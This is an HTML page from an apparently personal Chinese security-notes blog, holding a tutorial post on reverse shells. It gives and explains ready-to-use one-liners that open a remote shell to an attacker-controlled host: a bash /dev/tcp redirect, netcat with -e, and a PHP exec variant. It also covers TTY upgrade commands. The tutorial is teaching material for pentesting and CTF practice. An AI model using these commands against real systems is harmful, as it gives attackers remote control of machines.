@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>kmeeu的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="网络安全笔记">
+<meta property="og:type" content="website">
+<meta property="og:title" content="kmeeu的安全笔记">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="kmeeu的安全笔记">
+<meta property="og:description" content="网络安全笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="kmeeu">
+<meta property="article:tag" content="CTF，网络安全">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="kmeeu的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">kmeeu的安全笔记</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">言念君子，温其如玉</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-反弹shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/06/24/%E5%8F%8D%E5%BC%B9shell/" class="article-date">
+  <time class="dt-published" datetime="2024-06-24T07:19:54.000Z" itemprop="datePublished">2024-06-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/06/24/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>反弹shell是指控制端监听某个TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出传递到控制端的过程。</p>
+<p>reverse shell与telnet、ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p>反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。<br>如果有python环境，可以用这段代码来完善shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="反弹shell基础"><a href="#反弹shell基础" class="headerlink" title="反弹shell基础"></a>反弹shell基础</h4><p>举例常见的反弹shell语句：<code>bash -i &gt;&amp; /dev/tcp/VPS_IP/VPS_Port 0&gt;&amp;1</code></p>
+<h5 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h5><p>已知Linux下存在三种文件描述符：</p>
+<ul>
+<li>0 - stdin 标准输入，使用&lt; 或 &lt;&lt;</li>
+<li>1 - stdout 标准输出，使用&gt; 或 &gt;&gt;</li>
+<li>2 - stderr 标准错误输出，使用2或者2&gt;&gt;</li>
+</ul>
+<h5 id="的含义"><a href="#的含义" class="headerlink" title="&amp;&gt;的含义"></a>&amp;&gt;的含义</h5><p>反弹shell中的<code>&amp;</code>没有固定含义，放在<code>&gt;</code>后面的<code>&amp;</code>，表示重定向的目标不是一个文件，而是一个文件描述符。</p>
+<ul>
+<li>当<code>&gt;&amp;</code>后面接文件时，表示将标准 输出和标准错误输出重定向到文件</li>
+<li>当<code>&gt;&amp;</code>后面接文件描述符时，表示将前面的文件描述符重定向到后面的文件描述符</li>
+</ul>
+<h5 id="反弹shell语句含义"><a href="#反弹shell语句含义" class="headerlink" title="反弹shell语句含义"></a>反弹shell语句含义</h5><p><code>bash -i</code>表示在本地打开一个bash，<code>/dev/tcp/VPS_IP/VPS_Port</code>中<code>/dev/tcp/</code>是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，<code>&gt;&amp; /dev/tcp/VPS_IP/VPS_Port</code>表示将标准输出和标准错误输出重定向到这个文件上，即传递给远程，如果远程开启了对应端口的监听，就会接收到这个bash的标准输出和标准错误输出。</p>
+<p>此时在本地输入命令，本地是看不到输入的内容的，因为输入设备输入的命令和输出以及错误输出的内容已经被传递到远程上。<br>![[20230313161007.png]]<br>现在攻击机开启侦听端口<br>![[2020230313161036.png]]<br>然后再靶机输入指令，确保靶机再bash状态中<br>![[Pasted image 20230313161127.png]]<br><code>0&gt;&amp;1</code>表示将标准输入重定向到标准输出，然而此时标准输出已重定向到<code>/dev/tcp/VPS_IP/VPS_Port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，所以可以直接在远程输入了。</p>
+<h4 id="基于nc的反弹shell"><a href="#基于nc的反弹shell" class="headerlink" title="基于nc的反弹shell"></a>基于nc的反弹shell</h4><p>开启本地侦听<br><code>nc -lvvp 2233</code><br><img src="/20230313195640.png"><br>目标机连接攻击机<br><code>nc 192.168.62.152 2233 -e /bin/bash</code><br>![[20230313200124.png]]<br>![[20230313200142.png]]</p>
+<h4 id="基于nc没有-e参数的反弹shell"><a href="#基于nc没有-e参数的反弹shell" class="headerlink" title="基于nc没有-e参数的反弹shell"></a>基于nc没有-e参数的反弹shell</h4><p>开启端口侦听，一个输入端口，一个输出端口<br>![[20230313200636.png]]<br>![[20230313200647.png]]<br>目标机连接攻击机<br>![[20230313200810.png]]</p>
+<h4 id="基于php的反弹shell"><a href="#基于php的反弹shell" class="headerlink" title="基于php的反弹shell"></a>基于php的反弹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -c &#x27;</span> bash -i &gt;&amp; /dev/tcp/<span class="number">10.10</span>.<span class="number">10.128</span>/<span class="number">22333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&#x27;&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>代码的本质是用exec这个函数调用bash反弹，所以依旧nc侦听即可</p>
+<h4 id="获取完整的tty"><a href="#获取完整的tty" class="headerlink" title="获取完整的tty"></a>获取完整的tty</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<p>使用Python的<code>-C</code>参数来导入pty模块中的<code>pty.spawn</code>引用<code>/bin/bash</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm-color</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/06/24/%E5%8F%8D%E5%BC%B9shell/" data-id="clxspb1r60000zs1ob43g53yb" data-title="反弹shell" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">六月 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/06/24/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 kmeeu<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
